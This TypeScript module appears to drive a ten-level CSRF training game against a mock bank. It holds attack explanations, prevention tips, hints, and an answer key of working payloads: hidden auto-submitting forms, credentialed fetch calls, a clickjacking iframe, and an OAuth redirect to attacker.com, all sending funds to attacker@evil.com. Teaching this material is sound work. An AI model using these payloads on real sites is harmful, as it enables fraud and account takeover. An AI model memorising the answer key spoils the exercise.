import { CSRFLevelExplanation, CSRFLevel } from './types';

export const csrfLevelExplanations: Record<number, CSRFLevelExplanation> = {
  1: {
    attackName: 'Basic Form-Based CSRF Attack',
    howItWorks: 'The attacker creates a malicious website with a hidden form that automatically submits to the target site. When a logged-in user visits the malicious site, their browser automatically includes their authentication cookies, forging the request.',
    whyItSucceeds: 'There is no CSRF token validation. The server trusts any request that comes from an authenticated user, regardless of the origin. The browser automatically includes cookies with cross-origin requests.',
    realWorldImpact: 'An attacker can trick users into performing unwanted actions: transferring money, changing passwords, deleting accounts, or modifying sensitive settings without their knowledge.',
    preventionTips: ['Use CSRF tokens (synchronizer tokens)', 'Validate token on every state-changing request', 'Set SameSite cookie attribute', 'Verify Origin and Referer headers'],
  },
  2: {
    attackName: 'Predictable CSRF Token',
    howItWorks: 'The application uses CSRF tokens, but they are predictable (sequential, based on timestamps, or weak random). The attacker generates valid tokens by predicting the pattern.',
    whyItSucceeds: 'Weak token generation allows attackers to guess or calculate valid tokens. If tokens follow a pattern (1, 2, 3... or based on time), they can be easily predicted.',
    realWorldImpact: 'CSRF protection becomes useless if tokens are predictable. Attackers can forge valid-looking requests without needing to extract the actual token.',
    preventionTips: ['Use cryptographically secure random number generation', 'Generate long tokens (at least 32 bytes)', 'Use libraries like `uuid` or built-in crypto functions', 'Never use sequential or timestamp-based tokens'],
  },
  3: {
    attackName: 'Token Not Refreshed (Reuse)',
    howItWorks: 'The application uses CSRF tokens but doesn\'t invalidate them after use. An attacker captures a valid token from one request and reuses it for multiple attacks.',
    whyItSucceeds: 'Tokens are generated once per session and never refreshed. The same token can be used for unlimited requests, allowing attackers to perform multiple actions with a single captured token.',
    realWorldImpact: 'A single token compromise allows unlimited attacks. If a token is leaked through referer headers, logs, or browser history, it can be exploited repeatedly.',
    preventionTips: ['Regenerate tokens after each use', 'Use per-request tokens instead of per-session tokens', 'Store tokens in httpOnly cookies (not in HTML)', 'Implement token expiration with short TTL'],
  },
  4: {
    attackName: 'SameSite Cookie Bypass (Lax mode)',
    howItWorks: 'The application relies only on SameSite=Lax for CSRF protection. The attacker uses navigation methods (top-level redirect, link click) that include cookies even with Lax setting.',
    whyItSucceeds: 'SameSite=Lax allows cookies on top-level navigations (GET requests, links). Attackers can use POST + redirect chains or form submissions with specific HTML attributes to bypass it.',
    realWorldImpact: 'SameSite alone is insufficient. Older browsers don\'t support it, and its behavior varies. It should be combined with CSRF tokens for defense in depth.',
    preventionTips: ['Use SameSite=Strict for maximum protection', 'Always use CSRF tokens as primary defense', 'Combine multiple defenses (tokens + SameSite + Origin validation)', 'Test with older browsers'],
  },
  5: {
    attackName: 'Custom Header Bypass via Flash/Browser Quirks',
    howItWorks: 'The application relies on custom headers (X-Requested-With) for CSRF protection. The attacker uses older browser features or CORS preflight to bypass this check.',
    whyItSucceeds: 'Custom headers only protect against scripts (which can\'t set arbitrary headers in cross-origin requests). But certain browser bugs, Flash, or old APIs can add custom headers in specific ways.',
    realWorldImpact: 'Single-defense approaches are weak. Custom headers alone don\'t provide reliable CSRF protection across all scenarios and browser versions.',
    preventionTips: ['Use CSRF tokens as primary defense, not headers', 'Implement token validation with strict origin checking', 'Use Content Security Policy (CSP) to prevent script injection', 'Test with various browsers and security tools'],
  },
  6: {
    attackName: 'Double-Submit Cookie (Weak Implementation)',
    howItWorks: 'The application uses double-submit cookie pattern but doesn\'t validate domain/path correctly. The attacker sets a cookie on a parent domain to forge requests on subdomains.',
    whyItSucceeds: 'Cookie scoping is complex. If validation isn\'t strict (checking exact domain match), cookies set on parent domains override and can be exploited.',
    realWorldImpact: 'Subdomain takeover or cookie injection on parent domain allows CSRF attacks. This shows why token-based approaches are more secure than cookie-based ones.',
    preventionTips: ['Use token-based CSRF protection, not cookies', 'If using cookies, strictly validate domain/path', 'Use httpOnly flag to prevent JavaScript access', 'Implement proper cookie isolation'],
  },
  7: {
    attackName: 'JSON-Based CSRF with Content-Type Confusion',
    howItWorks: 'The application accepts both form-encoded and JSON requests. The attacker crafts a request that looks like form data but is interpreted as JSON due to Content-Type mismatch.',
    whyItSucceeds: 'Different content types have different CSRF protections. If the app accepts multiple types without proper validation, attackers can use the less-protected one.',
    realWorldImpact: 'APIs that accept multiple content types may have inconsistent CSRF protection. Attackers can switch to an unprotected content type to bypass tokens.',
    preventionTips: ['Validate Content-Type header strictly', 'Require CSRF tokens for all state-changing requests regardless of content type', 'Use consistent CSRF protection across all endpoints', 'Log and monitor content-type mismatches'],
  },
  8: {
    attackName: 'Clickjacking for CSRF Action',
    howItWorks: 'The application has CSRF protection but no clickjacking protection. The attacker covers the UI with a transparent iframe, tricking users into clicking on CSRF actions.',
    whyItSucceeds: 'Even with proper CSRF tokens, the action happens because the user genuinely clicked the button. The malicious site just tricks them about what they\'re clicking.',
    realWorldImpact: 'CSRF tokens don\'t prevent clickjacking. Users unknowingly perform actions on behalf of attackers. This is especially effective for sensitive actions.',
    preventionTips: ['Set X-Frame-Options: DENY header', 'Implement frame-busting JavaScript', 'Use Content Security Policy (CSP) frame-ancestors directive', 'Add user confirmation for sensitive actions'],
  },
  9: {
    attackName: 'Session Fixation + CSRF',
    howItWorks: 'The attacker first fixes a user\'s session ID, then exploits CSRF using that session. The application doesn\'t regenerate session tokens after login.',
    whyItSucceeds: 'Session fixation allows attackers to control the session ID. If CSRF tokens are tied to sessions and not regenerated after login, the attacker\'s token works.',
    realWorldImpact: 'Combined vulnerability: attacker controls both the session and knows the CSRF token. This completely bypasses CSRF protection.',
    preventionTips: ['Regenerate session ID after login', 'Use per-request CSRF tokens instead of per-session', 'Verify session consistency', 'Log suspicious session transitions'],
  },
  10: {
    attackName: 'OAuth/SSO CSRF Attack',
    howItWorks: 'The OAuth callback endpoint doesn\'t validate the state parameter properly. The attacker can forge OAuth login flows to compromise accounts.',
    whyItSucceeds: 'OAuth CSRF protection relies on the state parameter. If validation is weak (checking existence but not validity) or missing, CSRF becomes possible.',
    realWorldImpact: 'Attackers can hijack OAuth flows, force users to log in with attacker-controlled accounts, or trick them into authorizing malicious apps.',
    preventionTips: ['Validate state parameter value matches original request', 'Use cryptographically random state values', 'Store state in session/database, not just in cookies', 'Use PKCE for additional security', 'Validate redirect_uri matches whitelist'],
  },
};

export const levels: CSRFLevel[] = [
  {
    id: 1,
    title: 'Level 1: No CSRF Protection',
    description: 'This banking application has zero CSRF protection. Create a malicious form to transfer money!',
    hint: 'Create a hidden form from attacker\'s domain (evil.com) that posts to the transfer endpoint. Include "evil.com" or "localhost" in your payload to simulate the attacker\'s origin.',
    scenario: 'Transfer $100 to attacker@evil.com without CSRF token',
    type: 'form-based',
  },
  {
    id: 2,
    title: 'Level 2: Predictable Token',
    description: 'The app uses CSRF tokens, but they\'re predictable. Find the pattern and generate a valid token!',
    hint: 'Tokens are sequential: token_1, token_2, token_3... Use token_5 for the next transfer.',
    scenario: 'Predict the next CSRF token and forge a valid request',
    type: 'token-bypass',
    validTokens: ['token_1', 'token_2', 'token_3', 'token_4', 'token_5'],
  },
  {
    id: 3,
    title: 'Level 3: Token Not Refreshed',
    description: 'CSRF tokens exist but aren\'t invalidated after use. Reuse a captured token!',
    hint: 'Use the same token multiple times. Copy this token and submit it twice.',
    scenario: 'Reuse the same CSRF token for multiple requests',
    type: 'token-bypass',
    validTokens: ['reusable_csrf_token_12345'],
  },
  {
    id: 4,
    title: 'Level 4: SameSite Bypass (Lax)',
    description: 'The app only relies on SameSite=Lax cookies. Use a top-level navigation to include cookies!',
    hint: 'Top-level navigations (like window.location or <a> tags) include cookies even with Lax setting.',
    scenario: 'Use a link click to perform CSRF attack despite SameSite protection',
    type: 'same-site',
  },
  {
    id: 5,
    title: 'Level 5: Custom Header Bypass',
    description: 'The app only checks for X-Requested-With header. Bypass this with form submission!',
    hint: 'Regular form submissions don\'t include custom headers. Use standard HTML forms.',
    scenario: 'Bypass X-Requested-With header check with a form',
    type: 'custom-header',
  },
  {
    id: 6,
    title: 'Level 6: Double-Submit Cookie (Weak)',
    description: 'Double-submit cookie pattern has weak domain validation. Exploit subdomain issues!',
    hint: 'The parent domain cookie scope allows subdomain attacks.',
    scenario: 'Exploit domain scope vulnerability in double-submit cookie',
    type: 'token-bypass',
    validTokens: ['parent_domain_cookie_token'],
  },
  {
    id: 7,
    title: 'Level 7: Content-Type Confusion',
    description: 'The API accepts both form and JSON but has inconsistent CSRF protection.',
    hint: 'Send Content-Type: application/x-www-form-urlencoded instead of application/json',
    scenario: 'Bypass CSRF protection using Content-Type mismatch',
    type: 'form-based',
  },
  {
    id: 8,
    title: 'Level 8: Clickjacking for CSRF',
    description: 'CSRF token exists but no clickjacking protection. Overlay the button with iframe!',
    hint: 'Use <iframe> to cover the transfer button and trick users into clicking.',
    scenario: 'Perform CSRF attack through clickjacking overlay',
    type: 'form-based',
  },
  {
    id: 9,
    title: 'Level 9: Session Fixation + CSRF',
    description: 'The app doesn\'t regenerate sessions. Fix the session and exploit CSRF together!',
    hint: 'Control the session ID, then use that session\'s CSRF token for attack.',
    scenario: 'Exploit session fixation combined with CSRF',
    type: 'token-bypass',
    validTokens: ['fixed_session_csrf_token'],
  },
  {
    id: 10,
    title: 'Level 10: OAuth State Parameter Bypass',
    description: 'OAuth callback doesn\'t validate state properly. Forge a login flow!',
    hint: 'State parameter is checked for existence but not validity. Use any value.',
    scenario: 'Bypass weak OAuth state parameter validation',
    type: 'custom-header',
  },
];

export const csrfSolutions: Record<number, string> = {
  1: `<!-- This malicious form is hosted on attacker's domain (evil.com or localhost) -->
<!-- When victim visits this page while logged into bank.com, their session cookies are automatically included -->
<form method="POST" action="http://bank.com/transfer" style="display:none;">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="confirm" value="yes">
</form>
<script>
  // Automatically submit the form when page loads
  document.forms[0].submit();
</script>

<!-- In your payload, reference the attacker's domain like evil.com or localhost to prove it comes from attacker -->`,

  2: `<!-- Tokens follow pattern: token_1, token_2, token_3... -->
<form method="POST" action="http://bank.com/transfer">
  <input type="hidden" name="csrf_token" value="token_5">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <button type="submit">Claim Prize</button>
</form>`,

  3: `<!-- Reuse the captured token multiple times -->
<form id="csrf1" method="POST" action="http://bank.com/transfer">
  <input type="hidden" name="csrf_token" value="reusable_csrf_token_12345">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="50">
</form>
<form id="csrf2" method="POST" action="http://bank.com/transfer">
  <input type="hidden" name="csrf_token" value="reusable_csrf_token_12345">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="50">
</form>
<form id="csrf3" method="POST" action="http://bank.com/change_email">
  <input type="hidden" name="csrf_token" value="reusable_csrf_token_12345">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>
  // Submit all three forms with the same reused token
  document.getElementById('csrf1').submit();
</script>`,

  4: `<!-- Top-level navigation bypasses SameSite=Lax -->
<a href="http://bank.com/transfer?to=attacker@evil.com&amount=100&confirm=yes" 
   style="display:block; padding: 20px; background: blue; color: white; text-decoration: none;">
  Claim Your Prize!
</a>

<!-- Alternative: POST redirect -->
<form method="POST" id="csrf" action="http://bank.com/transfer">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
</form>
<script>
  // Window navigation (top-level) includes cookies
  window.location = "http://bank.com/redirect?url=" + encodeURIComponent("http://bank.com/transfer?to=attacker@evil.com&amount=100");
</script>`,

  5: `<!-- Regular form doesn't include custom X-Requested-With header -->
<form method="POST" action="http://api.bank.com/transfer" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name="to" value="attacker@evil.com">
  <input type="hidden" name="amount" value="100">
  <button type="submit">Proceed</button>
</form>`,

  6: `<!-- Exploit parent domain cookie scope -->
<!-- If parent domain (example.com) cookie is set, it affects subdomains (bank.example.com) -->
<script>
  // Set cookie on parent domain (if possible)
  document.cookie = "csrf_token=parent_domain_cookie_token; domain=.example.com; path=/";
  
  // Now use form on subdomain with parent domain's token
  fetch("http://bank.example.com/transfer", {
    method: "POST",
    credentials: "include",
    body: new FormData(document.querySelector("form"))
  });
</script>`,

  7: `<!-- Send form-encoded instead of JSON to bypass protections -->
fetch("http://api.bank.com/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  credentials: "include",
  body: "to=attacker@evil.com&amount=100&_token="
});`,

  8: `<!-- Clickjacking: overlay transparent iframe over button -->
<div style="position: relative; width: 500px; height: 300px;">
  <!-- Attacker's content (visible) -->
  <div style="z-index: 1; position: relative;">
    <button style="padding: 20px; font-size: 20px; cursor: pointer;">
      Click to Claim Free Prize!
    </button>
  </div>
  
  <!-- Target site iframe (transparent, on top) -->
  <iframe src="http://bank.com/transfer?to=attacker@evil.com&amount=100&confirm=yes"
    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
            opacity: 0; z-index: 2; cursor: pointer;">
  </iframe>
</div>`,

  9: `<!-- Session fixation + CSRF combined -->
<script>
  // 1. First, establish attacker's session (session=ATTACKER_SESSION_ID)
  // 2. Get the CSRF token from that session
  
  // 3. Send a request with both known session and token
  fetch("http://bank.com/transfer", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      csrf_token: "fixed_session_csrf_token",
      to: "attacker@evil.com",
      amount: 100
    })
  });
</script>`,

  10: `<!-- Bypass OAuth state parameter validation -->
<script>
  // Redirect to OAuth with any state value (app doesn't properly validate)
  window.location = "http://bank.com/oauth/authorize?" +
    "client_id=legitimate_app" +
    "&redirect_uri=http://attacker.com/callback" +
    "&state=any_random_value";  // Weak validation allows any value
  
  // When callback comes back with code, exchange it for attacker's benefit
</script>`,
};
